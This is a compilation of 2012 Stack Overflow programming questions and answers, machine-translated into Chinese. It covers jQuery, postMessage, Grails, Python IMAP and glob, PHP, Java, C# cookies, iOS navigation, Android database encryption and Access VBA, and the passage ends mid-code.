这是一个演示：[http ://sqlfiddle.com/#!3/c2620/1/0](http://sqlfiddle.com/#!3/c2620/1/0)

# jquery - 将类添加到父级 检查孩子href时

> ID：13093777
> 
> 赞同：0
> 
> 时间：2012-10-26T20:12:18.597
> 
> 标签：jquery, css, twitter-bootstrap

我正在使用 twitter Bootstrap 框架，我想根据显示的页面更改活动链接。（如果这不适合 Stackoverflow，只需将其删除）

基本导航菜单 html 如下。注意到“活动”类了吗？这会突出显示活动链接。

```
<ul class="nav">
   <li class="active"><a href="default.aspx">View Programs</a></li>
   <li><a href="addprogram.aspx">Add Programs</a></li>
   <li><a href="contacts.aspx">Contacts</a></li>
</ul> 
```

jQuery 代码...我从所有 li 标签中删除了“active”类，并将其添加回 li 标签，并显示页面链接。

```
 $(document).ready(function () {
        $("ul.nav > li").removeAttr("class");
        $("ul.nav > li a[href*='contacts.aspx']").parent("ul.nav > li").addClass("active");
    }); 
```

这个知道给我...

```
 <ul class="nav">
   <li><a href="default.aspx">View Programs</a></li>
   <li><a href="addprogram.aspx">Add Programs</a></li>
   <li class="active"><a href="contacts.aspx">Contacts</a></li>
</ul> 
```

* * *

这行得通，但它是正确的方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T20:15:54.550

你做的很好。但是我不会删除标签中的类属性，而是这样做，因为将来您可能会使用多个类。

```
$("ul.nav > li").removeClass("active"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:18:28.310

有很多方法可以做到...

```
$(function () {
    // I'd just use removeClass()
    $("ul.nav > li").removeClass("active");

    // And just grab the closest() list-item, just easier to read
    $("ul.nav > li a[href*='contacts.aspx']").closest('li').addClass('active');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:20:58.267

一般来说，你有很多选择器。尽量避免使用它们以获得更好的性能（如果你在乎的话）。

> $("ul.nav > li").removeAttr("class");

这条线看起来不对。相反，我会做

> $("ul.nav > li").removeClass("active");

关于这条线

> $("ul.nav > li a[href*='contacts.aspx']").parent("ul.nav > li").addClass("active");

你确定你不能将 LI 在服务器端激活吗？

请注意，如果您从 URL 中删除“contacts.aspx”，您会遇到安全问题。

# html - 停止收听 postMessage 消息事件

> ID：13093785
> 
> 赞同：7
> 
> 时间：2012-10-26T20:13:31.043
> 
> 标签：html, postmessage

我似乎无法删除接收者事件侦听器。鉴于控制台下方的代码将继续无休止地 打印“ *hi ”。*

**接收器**：

```
window.addEventListener("message", function(e){
       console.log('hi');
       window.removeEventListener("message", function(e){}, false)
}, false); 
```

**发件人**：

```
var emiter = setInterval(function(){
            console.log('sending message');
            window.parent.postMessage( messageData, "*" );
        }, 1000); 
```

有没有解决的办法 ？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-26T20:19:06.503

我相信为了删除侦听器，您必须引用相同的函数，如下所示：

```
var f = function(e){
  console.log('hi');
  window.removeEventListener("message", f, false);
}
window.addEventListener("message", f); 
```

所以你的不起作用的原因是因为它没有引用该函数作为侦听器。

# ios - IE 8 和 9 中的 ios 备用内容回退（flash 不会显示）

> ID：13093788
> 
> 赞同：2
> 
> 时间：2012-10-26T20:13:51.333
> 
> 标签：ios, html, flash, internet-explorer

我试图为我们的桌面访问者保留我们的 Flash，但为 ipad 用户制作了一个动画 gif 解决方案。我在下面有这段代码，gif 在 ipad 上运行良好，在 Chrome、FFox 和 Safari 中一切正常，flash 照常显示——但今天意识到在 IE 8 和 9 中——flash 不再显示了。

我想知道我是否可以添加任何其他代码 - 在 IE 中工作 - 或者，我是否可以添加另一段代码，至少可以将静态图像添加到 IE。显然，如果有人知道解决方案，我**更喜欢在 IE 中再次显示 Flash 。**我非常感谢你。

```
 <!-- test of alternate image -->
    <div id="altimage" style="display:none">
<img src="http://www.kqimageserver.com/kqimages/flash/1ST.gif">
</div>

<div id="aleosoftflash" style="display:block">

<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"     codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0"     width="540" height="140">
<param name="movie" value="flashmovie.swf" />
<param name="quality" value="high" />
<param name="allowScriptAccess" value="always" />
<param name="wmode" value="transparent" />
<embed src="https://www.kqimageserver.com/kqimages/flash/July27_2012.swf"
quality="high"
type="application/x-shockwave-flash"
WMODE="transparent"
width="510"
height="300"
pluginspage="http://www.macromedia.com/go/getflashplayer"
allowScriptAccess="always" />
</object>
</div>
<script language="javascript">
if ((navigator.userAgent.match(/iPad/i) != null) || (navigator.userAgent.match(/iPhone/i) !=   null) || (navigator.userAgent.match(/iPod/i) != null)) { document.getElementById("altimage").style.display = "block"; document.getElementById("aleosoftflash").style.display = "none"; }
</script> 
<!-- end test  --> 
```

# grails - 多个 Grails 项目命名相同的构建问题

> ID：13093791
> 
> 赞同：1
> 
> 时间：2012-10-26T20:13:59.530
> 
> 标签：grails, setup-project, dependency-management

我目前有一个用于我们的“主线”代码的工作区，以及我们在每次迭代结束时创建的每个分支的 1 个工作区。我使用的是 STS 和 grails 1.3.6，没有添加插件和几个 java jar 文件。似乎每当我为新分支创建新工作区时，分支工作区最终都会损坏。我开始在本地遇到构建错误，这些错误围绕缺少的休眠类（例如`AbstractEntityPersister`. 我在 Windows 7 环境中工作。

我的问题有两个。

一-这个问题可能与缓存问题有关吗？从理论上讲，工作区之间的构建 grails 依赖 jar 应该是相同的，所以我不知道为什么一个工作区会出现问题而一个不会

二-调试上述问题的最佳方法是什么？目前我唯一要做的就是问题视图，然后尽我所能比较两个工作区。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T13:52:21.820

默认情况下，grails 使用“$USER_HOME/.grails/grailsVersion/projectName”作为工作目录，因此拥有两个同名和相同 grails 版本的项目会让人头疼。

查看下面的文档，您需要在每个项目 BuildConfig 中设置“projectWorkDir”以防止干扰。

[http://grails.org/doc/latest/guide/commandLine.html#buildCustomising](http://grails.org/doc/latest/guide/commandLine.html#buildCustomising)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-28T03:18:38.123

您的项目工作目录是否具有完全相同的名称？

Grails 创建一个项目缓存文件夹，`$USER_HOME/.grails/<grailsVersion>/projects/<basedirname>`其中包含已编译的插件和脚本。即使运行`grails clean`也不会清除这些目录。

同名的两个项目很可能同时更新此文件夹中的文件。从理论上讲，这不应该搞砸任何事情，因为您可能没有同时处理这两个项目，但是如果您在 STS 中都打开了这两个项目，那么它可能会自动构建并弄乱 Grails 使用的自动重新加载机制。

我会尝试使用 asdocumented 设置工作目录`BuildConfig.groovy`或覆盖文件`grails -Dgrails.project.work.dir=work` [夹](http://grails.org/doc/latest/guide/single.html#buildCustomising)。

如果做不到这一点，我建议禁用 STS 中的任何自动构建，因为 Grails 本身会在`run-app`运行时编译/重新加载类。此外，我会尝试使用文本编辑器（Sublime Text 2 很棒）而不是 STS 来编辑您的应用程序，看看您是否有同样的问题。

# python - 使用 GMAIL imap X-GM-RAW 搜索 utf-8 字符串

> ID：13093793
> 
> 赞同：2
> 
> 时间：2012-10-26T20:14:14.590
> 
> 标签：python, gmail, gmail-imap, imaplib

似乎

如何使用非 ascii 字符串进行 GMAIL SEARCH

[来自 Google Groups](https://groups.google.com/forum/?fromgroups=#!topic/google-mail-xoauth-tools/5B_lwWFYbDw)的一些评论，但无法掌握如何使用 Python 和创建它`imaplib`：

> 使用文字发送非 ASCII 数据：

```
. search charset utf-8 x-gm-raw {30}
+ go ahead
"живалов -йцукен"
* SEARCH 586
. OK SEARCH completed (Success) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-27T10:17:37.327

[这是使用 utf-8 编码的主题的 Python IMAP 搜索](https://stackoverflow.com/questions/9997928/python-imap-search-using-a-subject-encoded-with-utf-8)的副本，经过广泛的研究，我在那里得出了相同的结论：目前这是不可能用 Python 的[`imaplib`](http://docs.python.org/library/imaplib.html)模块实现的，因为该[`search`](http://docs.python.org/library/imaplib.html#imaplib.IMAP4.search)方法不支持 IMAP 文字（`{<number>}`使用的字符串表示文字由`imaplib`) 引用。这同样适用于该[`uid`](http://docs.python.org/library/imaplib.html#imaplib.IMAP4.uid)方法，因此它不能用于解决该`search`限制。

请注意，在过去，此功能可能是在不使用 IMAP 文字的情况下实现的，如问题[Python IMAP search using a subject encoding with iso-8859-1](https://stackoverflow.com/questions/5640327/python-imap-search-using-a-subject-encoded-with-iso-8859-1)中所示。

`imaplib`显然需要一些黑客攻击，因此`search`支持将搜索字符串作为文字传递，就像在您问题中的原始 IMAP 交互中一样。一种可能是在[imapclient](http://imapclient.freshfoo.com/)项目的上下文中实现它，这可能比对 Python 标准库的更改更容易。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-08T08:03:32.067

My [fork of the IMAPClient](https://bitbucket.org/john2x/imapclient) library adds a [`gm_search()`](https://bitbucket.org/john2x/imapclient/commits/cba69ca49fc0dc22392d19905d50ec79f77ea9d6) method which perform's Gmail's X-GM-RAW search query using IMAP literals.

Example:

```
imap_client.gm_search(u'subject:"ƒoo∫ar" has:attachment', charset='utf8') 
# The method encodes the unicode string internally. I'm debating with myself if that's a good idea or not. 
```

I'm waiting for feedback from the author if it should be included in the main project.

# javascript - 将顺序 jQuery 选择器组合成一个函数

> ID：13093794
> 
> 赞同：1
> 
> 时间：2012-10-26T20:14:15.070
> 
> 标签：javascript, jquery, function

**大编辑：更新了代码部分，但问题保持不变。**

我可能有一个独特的 jQuery 问题，我可以使用一些帮助。

我有一个看起来像这样的功能（完美运行）......

```
var openslide1 = function() { 
      $("#slide1").animate({
        left: "+=250px",
      }, 400, function() {
        // Animation complete.
      });
      $(this).unbind('click', openslide1); \\ to prevent from pushing slide over too many times
};

$("#openslide1").click(openslide1); 
```

我的问题是可能有无限数量的幻灯片，因此是“openslides”。每个“openslide”选择器都对应于它自己独特的幻灯片。（例如#openslide2 将打开#slide2 并取消绑定#openslide2...等等）。

那么如何将它们组合成一个变量和函数呢？

作为旁注......我还想在点击另一个事件时“重新绑定”#openslide。目前，我可以通过这个一次做一个......

```
$("#closeslide1").click(function() {
    $("#slide1").animate({
        left: "-=250px",
      }, 500, function() {
        // Animation complete.
      }); 
    $('#openslide1').click(openslide1); \\ rebinds openslide1
}); 
```

但是一旦这成为一个组合函数，我假设“openslide1”将不再是函数的变量。那么当单击#closeslide 时，我将如何重新绑定该单击事件。（显然我将使用这个问题的第一部分也适用于 closeslide 变量。）

```
<div class="section">
<a class="edit-btn" id="openslide1" href="#null">edit</a>
<a class="edit-btn" id="openslide2" href="#null">edit</a>
<a class="edit-btn" id="openslide3" href="#null">edit</a>
<a class="edit-btn" id="openslide4" href="#null">edit</a>
</div>
<div class="slide" id="slide1">
<h1>Edit Row</h1>
<p>Prototyping data below, may not reflect link clicked.</p>
<a href="#null" id="submitslide1" class="btn btn-primary">Submit</a> <a id="closeslide1" class="btn btn-danger" style="color:#fff" href="#null">Cancel</a>
</div>
<div class="slide" id="slide2">
<h1>Edit Row</h1>
<p>Prototyping data below, may not reflect link clicked.</p>
<a href="#null" id="submitslide2" class="btn btn-primary">Submit</a> <a id="closeslide2" class="btn btn-danger" style="color:#fff" href="#null">Cancel</a>
</div>
<div class="slide" id="slide3">
<h1>Edit Row</h1>
<p>Prototyping data below, may not reflect link clicked.</p>
<a href="#null" id="submitslide3" class="btn btn-primary">Submit</a> <a id="closeslide3" class="btn btn-danger" style="color:#fff" href="#null">Cancel</a>
</div>
<div class="slide" id="slide4">
<h1>Edit Row</h1>
<p>Prototyping data below, may not reflect link clicked.</p>
<a href="#null" id="submitslide4" class="btn btn-primary">Submit</a> <a id="closeslide4" class="btn btn-danger" style="color:#fff" href="#null">Cancel</a>
</div> 
```

请帮忙！

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T22:43:51.190

构建链接如下：

```
<div class="section">
    <a class="edit-btn openslide" data-slide="#slide1" href="#null">edit</a>
    <a class="edit-btn openslide" data-slide="#slide2" href="#null">edit</a>
    <a class="edit-btn openslide" data-slide="#slide3" href="#null">edit</a>
    <a class="edit-btn openslide" data-slide="#slide4" href="#null">edit</a>
</div> 
```

幻灯片如下：

```
<div class="slide" id="slide1">
<h1>Edit Row</h1>
<p>Prototyping data below, may not reflect link clicked.</p>
<a href="#null" class="submitslide1 btn btn-primary">Submit</a> <a class="closeslide1 btn btn-danger" style="color:#fff" href="#null">Cancel</a>
</div> 
```

很难确切看出需要什么效果，但处理程序的一般形状将是这样的：

```
$(".openslide, .closeslide").click(function() {
    if($("body").filter(":animated").length) { return; } //animation in progress, abort.
    var $slide = $($(this).data('slide'));
    var state = $slide.data('state') || 'closed';
    var sign = (state == 'closed') ? '+' : '-';
    $slide.animate({
        left: sign + "=250px"
    }, 400, function(){
        $slide.data('state', (sign == '+') ? 'open' : 'closed');
    });
    $('body').animate({
        marginLeft: sign + "=250px"
    }, 400);
    return false;
}); 
```

*未经测试*

正如您将看到的，一个函数（当它工作时）将同时处理 slideopen 和 slideclose 动作。

您必须调整脚本以准确实现您想要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:24:31.677

我试一试，这对您的便携性有帮助吗？

```
$(".openslide1").click(function() {
      openSlide(".slide1", "body", 400, ".openslide1");
});

function openSlide(target, bodyObj, speed, original) {
      $(target).animate({
        left: "+=250px",
      }, speed, function() {
        // Animation complete.
      });
      $(bodyObj).animate({
        marginLeft: "+=250px",
      }, speed, function() {
        // Animation complete.
      });
      $(original).unbind('click');
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:29:52.403

更改您的函数以传递对您要操作的元素（或多个元素）的引用：

```
var openslide = function(elem) { 
  var id = elem.attr("id");
  $("#" + id.substring(5)).animate({
    left: "+=250px",
  }, 400, function() {
    // Animation complete.
  });
  $('body').animate({
    marginLeft: "+=250px",
  }, 400, function() {
    // Animation complete.
  });
  elem.unbind('click', openslide);
};

$(".edit-btn").click(function() {openslide($(this))}); 
```

然后，您可以对所有元素使用单个函数，如果它们有一个公共类（在这种情况下，我称之为它们`.openslide`），您可以同时绑定它们。

编辑：再次查看您的原始问题，我注意到一开始动画的元素不是同一个元素。但是，如果它与您单击的元素之间存在易于定义的关系（例如，它是原始元素的子元素、下一个兄弟元素或其他元素），您可以轻松地提出适当的选择器来选择它。在上面的示例中，我假设与具有类的目标元素的兄弟关系`.targetclass`，但将其更改为适合。

编辑 2：将其更改为使用 id，假设 id`openslide1`将对应于具有 id 的元素`slide1`。

# php - 带有 MySQL 查询的空白 HTML 页面

> ID：13093799
> 
> 赞同：0
> 
> 时间：2012-10-26T20:14:46.173
> 
> 标签：php, mysql

有谁知道为什么这段代码不起作用=

```
<html>
<head>
<title>Retrieve data from database </title>
</head>
<body>

<?php
include('connection.php');  

$sqlget = "SELECT navcode FROM nav";
$sqldata = mysqli_query($dbcon, $sqlget) or die ('error gettting request');

echo "<table>";
echo "<tr><th>navcode</th></tr></table>";

while($row = mysqli_fetch_arrary($sqldata, MYSQLI_ASSOC)) {
    echo "<tr><td>";
    echo $row['navcode'];
    echo "</td></tr>";}
echo "</table>";        
?>
</body>
</html> 
```

我的数据库有数据，但是查询页面显示为空白。我错过了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:17:41.543

Looks like you mispelled `mysqli_fetch_array`...

```
while($row = mysqli_fetch_array($sqldata, MYSQLI_ASSOC)) { 
```

instead of

```
while($row = mysqli_fetch_arrary($sqldata, MYSQLI_ASSOC)) { 
```

# java - 用于计算字节数组中位数的Java方法

> ID：13093800
> 
> 赞同：1
> 
> 时间：2012-10-26T20:14:50.807
> 
> 标签：java, arrays, byte, bit-manipulation

我在此处或一般网络上找不到与 Java 相关的有用答案。问题看起来很简单——我需要一种方法来计算任意大小的字节数组中包含的位数。字节数组可以保存十六进制、十进制或二进制值。

我敢肯定，当我看到答案时，这是让我自责的问题之一，但事实证明这非常令人沮丧。该方法应类似于：

```
public int bitsInByteArray(byte[] b) {
    return - sum of bit count (ie the sum total bits, not the sum of their values) 
    of each byte in b
} 
```

任何方向或建议将不胜感激。

编辑 - 抱歉，伙计们，我说的完全不对。我正在执行加密分配，并被要求“使用带有密钥 k 的 AES 加密包含 64 个零位的单个块”现在，我创建了 byte[] zeroBlockAes = {0x0,0x0...0x0} 直到它包含64 个零元素。问题是，这确定是 512 位吗？那么我应该只输入八个零值吗？

当我这样做时，我的加密输出是 -75 111 69 107 -18 88 51 89 68 -123 -49 18 -26 -109 94 21

当我再次解密时，我得到了原来的八个零。这在 AES 中是正常的还是我可能做错了什么，我认为分组密码为加密和解密产生了相同大小的输入/输出。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T20:17:14.627

鉴于**1 字节**等于**8 位**，这是 Java 在 中定义的`Byte.SIZE`，我们可以这样写：

```
 public int bitsInByteArray(final byte[] b) {
     return b.length * Byte.SIZE;
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:18:59.733

正如其他人已经说过的那样，如果它是一个字节数组，那么答案是将长度乘以 8，因为一个字节总是 100% 保证是 8 位。

但是，如果你有一个其他类型的数组（ints、longs 等），那么你会有点卡住，因为 Java 没有 sizeOf 方法，它会给出给定类型的字节大小。

这些类型*现在通常是标准化的，但当然它们*仍可能因地而异（极不可能），因此您无法保证它们占用了多少内存。

这是家庭作业吗？如果不是......你可能做错了什么，如果你问这个关于java的问题。

# visual-studio-2010 - 强制 Visual Studio 2010 使用源服务器查找文件

> ID：13093801
> 
> 赞同：5
> 
> 时间：2012-10-26T20:15:01.833
> 
> 标签：visual-studio-2010, debugging

当我使用 Visual Studio 2010 调试故障转储文件（本机代码）时，它会尝试从原始构建文件夹加载 C/C++ 源文件（并给出消息`"The source file is different from when the module was built. Would you like the debugger to use it anyway?"`）。消息正确；该文件不是正确的版本。

我希望 VS2010 做的是使用源服务器检查源文件。如果文件*当前不存在*于其原始构建位置，VS2010 将正确使用源服务器并检索文件的适当修订版（来自 Subversion）。为了强制它检查正确的版本，我必须从原始构建位置物理删除文件。

附带说明一下，VS2005 可以按预期工作（嗯......如我所愿，也许不像其他人所希望的那样）。无论文件的副本是否存在于原始构建文件夹中，VS2005 都会始终从源代码管理中检查出正确的版本。

我相信问题归结为以下之一：

*   是否有某种设置可以改变 VS2010 查找源文件的优先级？
*   或者，是否可以让 VS2010 提供一个选择/选项来检查有问题的源文件？（目前我在这种情况下看到的唯一选择是浏览它。）
*   或者是否可以从搜索中完全排除特定路径（文件夹）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T14:44:21.137

我对 VS2010 也有同样的问题，并试图解决这个问题。我用 procmon 监视了 devenv.exe，但没有看到它正在访问的文件和注册表项有任何异常。当 VS2010 找不到源时，您在错误报告中看到的信息几乎相同。我的解决方案是使用 VS2005，因为它工作正常。我确实在 MSDN 上看到了一些关于类似（如果不相同）错误的通信，他们声称它将在 2012 年的最终版本中修复。我相信我有 2012 年的最终版本，它也有同样的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T14:34:00.890

这是一个可能稍微复杂的解决方案

1) 创建一个脚本来下载和替换 pdb 文件（一个 .bat，一个 python 脚本，等等）

2）在VS2010中创建一个新的外部工具（工具->外部工具->添加）

3）将工具指向您的脚本并将任何特定于项目的内容作为参数传递给它

4）在您的项目中创建一个构建后或预构建步骤，该步骤将调用您的新外部工具（项目属性->构建事件->任何）

这是很多工作，但至少它将完全集成到您的构建过程中。

注意：有时我注意到我的后期构建步骤不会运行，除非我至少在 cpp 文件上进行了编译。我通常按​​ F7 并构建一些源代码，然后完全构建，以确保一切按预期工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-26T02:20:43.763

调试故障转储文件时，可以将本地源目录更改为不同的名称。

或者，您可以将构建目录更改为与本地目录不同的路径。

# c# - 将 Cookie 添加到 CookieCollection 时出现 NullReferenceException

> ID：13093805
> 
> 赞同：0
> 
> 时间：2012-10-26T20:15:13.163
> 
> 标签：c#, asp.net, cookies

我在 cookiecontainer.add(OC); 处得到一个空引用异常；

我不知道我做错了什么，因为我正在遵循以下示例：[使用 HttpCookieCollection 和 CookieContainer 发送 cookie](https://stackoverflow.com/questions/1214387/sending-cookies-using-httpcookiecollection-and-cookiecontainer/1214428#comment17793512_1214428)，我或多或少地完美地遵循了它。引用 cookie 的 INDEX 和 KEY 都会发生错误。

```
System.Net.HttpWebRequest request = (System.Net.HttpWebRequest)System.Net.HttpWebRequest.Create(URI);
        request.KeepAlive = true;
        HttpCookieCollection cookieJar = Request.Cookies;
        //foreach (string cookieString in Request.Cookies)
        for(int i = 0; i < cookieJar.Count; i++)
        {
            System.Web.HttpCookie cookie = cookieJar.Get(i);
            Cookie oC = new Cookie();
            oC.Domain = Request.Url.Host;
            oC.Expires = cookie.Expires;
            oC.Name = cookie.Name;
            oC.Path = cookie.Path;
            oC.Secure = cookie.Secure;
            oC.Value = cookie.Value;

            request.CookieContainer.Add(oC);
        } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-26T20:20:30.877

```
request.CookieContainer = new CookieContainer();
request.CookieContainer.Add(oC); 
```

`A CookieContainer is null by default. You must assign a CookieContainer object to the property to have cookies returned in the Cookies property of the HttpWebResponse returned by the GetResponse method.`- ***MSDN***

# python - 如何只全局化没有扩展名的文件？

> ID：13093806
> 
> 赞同：2
> 
> 时间：2012-10-26T20:15:22.250
> 
> 标签：python, glob

我有如下文件：

```
filename_000
filename_000.sh
filename_000.e
filename_000.o 
```

有没有办法可以在 glob 函数中指定正则表达式？像这样的东西：

```
from glob import glob
for file in glob("filename_[0-9]{1,3}$"):
    ... 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:23:24.580

另一种可能：

```
glob("filename_???") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:21:18.780

使用`re`模块：

```
import re
import os
pattern="filename_[0-9]{1,3}$"
for file in re.findall(pattern ,'\n'.join(os.listdir())):
    ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:20:57.250

没关系。刚刚想通了。我猜一个正则表达式会做到这一点：

```
from glob import glob
import re

re_file = re.compile("filename_[0-9]{1,3}$")
files = glob("filename*")
files = [f for f in files if re_file.findall(f)] 
```

# objective-c - 以两种方式显示视图（推送和模态）

> ID：13093810
> 
> 赞同：0
> 
> 时间：2012-10-26T20:15:40.970
> 
> 标签：objective-c, ios, uinavigationcontroller, uinavigationbar, uistoryboardsegue

我正在使用故事板。我有一个`UINavigationController`, 以 a`UITableViewController`作为它的`rootViewController`。从这个表视图中，用户可以通过两种方式访问`DetailViewController`​​（自定义子类）：`UIViewController`

1.  点击表格单元格以查看其信息
2.  点击加号按钮创建一个新项目

对于方式 1，我希望我的 segue 被推动。对于方式 2，我希望以模态方式显示详细信息。

起初我以为这应该不会太难，但我遇到了一些麻烦。是什么导致了这个麻烦：导航栏。当下一个视图被推送时，导航栏就在那里。但是，当下一个视图模态显示时，导航栏不存在。

我知道 Apple 已经考虑过这一点，这是最合乎逻辑的方法，但我需要模式视图中的导航栏再次关闭模式视图（使用取消和完成按钮）。通过界面生成器添加此导航栏不会带来好运：对于模态显示的视图，它工作正常，但在我的推送视图中，我突然有两个导航栏。

对此的逻辑解决方案是以编程方式添加导航栏，前提*是*视图以模态方式显示。我这样做了，并显示了导航栏，但它与视图重叠。我尝试调整视图的大小，使其与被推送的视图具有相同的大小，但我没有设法解决问题：导航栏仍然与视图重叠。

我现在停止尝试的原因有两个：我不知道该尝试什么了，而且我觉得应该有一个更简单的方法，因为我可能不是唯一一个尝试实现这一目标的人。

谁能帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T21:23:26.747

您可以使用您的详细视图控制器作为其根视图控制器创建另一个导航控制器。然后使用您的主视图控制器作为演示者以模态方式呈现该新导航控制器。

# jquery - 更新全局变量

> ID：13093815
> 
> 赞同：1
> 
> 时间：2012-10-26T20:16:24.200
> 
> 标签：jquery

我需要一些帮助。我正在尝试让自己的内容滑块编写自己的代码，但似乎无法弄清楚。我是新手，正在学习这一切，所以任何帮助都将不胜感激。我想要做的是当用户单击下一步时，它将隐藏当前幻灯片并显示下一张。我正在尝试使用全局变量来执行此操作，但我不确定如何维护从函数内部更新的全局变量。这是一些代码，我知道我的解释不是很好。

```
$(function () {

    var i = '';

    $('.next').click(function() {
        $('.slide' + i).hide();
        i++;
        console.log(i);
        if(i <= 4) {
        $('.slide' + i).show();
        }
        else {
        var i = 1;
        $('.slide' + i).show();
        i++;
        console.log(i);
        }
    });

}); 
```

和标记

```
<div class="outerWrapper wrapperWidthHeight">
    <div class="innerWrapper wrapperWidthHeight slide1">
    1
    </div>
    <div class="innerWrapper wrapperWidthHeight slide2">
    2
    </div>
    <div class="innerWrapper wrapperWidthHeight slide3">
    3
    </div>
    <div class="innerWrapper wrapperWidthHeight slide4">
    4
    </div>
</div>
<div class="next">NEXT</div> 
```

和 CSS

```
.wrapperWidthHeight {
    margin:auto;
    width:900px;
    height:600px;
    }

.outerWrapper {
    overflow:hidden;
    position:relative;
    margin-top:10px;
    border:1px solid black;
    border-radius:15px;
    box-shadow: 2px 2px 5px 5px #888;
    }

.innerWrapper {
    position:absolute;
    text-align:center;
    padding:0;
    margin:auto;
    }

.slide1 {
    display:block;
    }

.slide2, .slide3, .slide4 {
    display:none;
    }

.next{
    display:block;
    margin:auto;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:27:58.387

```
$(function () {

    var i = 1;   // should be a number
    // this var IS NOT global, nut it is available to
    // the scope of the anonymous function

    $('.next').click(function() {
        // accessing i here is only accessing via
        // the scope chain, i isn't "global" this way

        $('.slide' + i).hide();
        i++;
        console.log(i);

        if(i > 4) {
           i = 1;  // DON'T write "var" here, doing so
                   // defines a NEW local variable i in the local scope
        }

        $('.slide' + i).show();
        // you don't need to increment i here,
        // it's already incremented by setting from 4+ to 1
        console.log(i);
    });
});​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:22:08.983

只需对你让它为我工作的东西做一些调整：

```
$(document).ready(function () {

    var i = 1;

    $('.next').click(function () {
        $('.slide' + i).hide();
        i++;
        console.log(i);
        if (i <= 4) {
            $('.slide' + i).show();
        }
        else {
            i = 1;
            $('.slide' + i).show();
            console.log(i);
        }
    });

}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:19:18.907

尝试在函数之外创建全局变量作为窗口对象的成员。你可以把这样的东西放在你的函数之外：

```
window.i = 0; 
```

如果你要增加它，你也应该将它初始化为零，而不是一个空字符串，我并不是说它会导致问题，只是这是一个好习惯。

# java - Secure database storage in Android

> ID：13093817
> 
> 赞同：1
> 
> 时间：2012-10-26T20:16:26.850
> 
> 标签：java, android, security

I'm implementing the in-app-billing system for my app and (as the documentation advices) I'd like to add some encryption system to the database.

I've tested [SQLCipher](https://guardianproject.info/code/sqlcipher/), I liked it but since it need to override all the classes at `android.database.sqlite.*` your app loses the connection to that part of the SDK, losing possible important future updates and depending on the developer (or yourself since is opensource).

Other solution I've considered is to add a extra column in the `sensible` tables storing there a value (unique for each device), and then ignore the data that don't contain that key. But this method is clearly more weak.

How can I improve the security without using SQLCipher? Thanks

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T22:51:31.977

如果您的`sensible`表包含合理的列和一些不合理的列，并且如果您不在`where`子句中使用合理的列，则您可以轻松地加密/解密写入/读取操作中的敏感字段，而不会产生显着的性能成本.

如果您需要在只有几条记录的表中的 where 子句中使用合理的列，您可以读取所有记录，解密并选择。

如果以上都不适用，那么我没有其他建议了`SQLCipher`。

# vba - Access Hangs on Subform recordsource set to SQL from VBA

> ID：13093820
> 
> 赞同：1
> 
> 时间：2012-10-26T20:16:34.153
> 
> 标签：vba, ms-access, ms-access-2003, ms-access-2000

I have a "Search" form in my database that takes in a string, explodes it into an array and builds an SQL string based on a selected join type ("Or", "And", or "Exact Phrase" radio buttons). My code works perfectly 95% of the time, but every once and while the database hangs when I switch between the different join types and requery. I have confirmed that the SQL is being created properly and I think that the problem stems from trying to change the subform's recordsource while it is still loading.

The exact way that my search form works is as follows:

1.  The user puts a search term/phrase in a text box
2.  On the "After Update" event of the textbox, VBA creates an SQL string and stores it in a hidden text field (dubbed "ModifiedSearchValue")
3.  If the user changes the join type (radiobuttons with options "Or", "And", Or "Exact Phrase") the "After Update" event on the group evokes the VBA sub (as in #2) and VBA creates an SQL string which it stores in the hidden text field (dubbed "ModifiedSearchValue")
4.  When the user hits the "Search" button, VBA sets the RecordSource of the subform to the value of "ModifiedSearchValue" by:

    Me!Results.Form.RecordSource = Me.ModifiedSearchValue

Again, this works perfectly most of the time, but if you enter the search term, click "Search", then change the join type and hit "Search" again, it causes the database to hang approximately 5% of the time.

My main VBA code is as follows

```
 Private Sub SearchString()
Dim SearchString, SearchStringTitle, SearchStringName, SearchStringDescription, SearchStringInvestigator, JoinValue, j, SQLString As String, SearchArray, varValue As Variant

    SearchString = Trim(Me.SearchValue)

    If Not IsNull(SearchString) Then
        SearchArray = Split(SearchString, " ")

        SQLString = "SELECT tbl_Studies.StudyID, tbl_Studies.Study_Short_Title, tbl_Studies.Study_Name, tbl_Studies.Study_Description, [qry_General:FullName_FMLD].FullName AS Investigator, tbl_Studies.Project_Type, IIf([Project_Type]=1,[tbl_Studies:Status]![Status],[tbl_Studies:NR_Status]![NR_Status]) AS Overall_Status, tbl_Studies.Date_Submitted, tbl_Studies.Date_Updated, tbl_Studies.Results_Summary, tbl_Studies.Inactive " & _
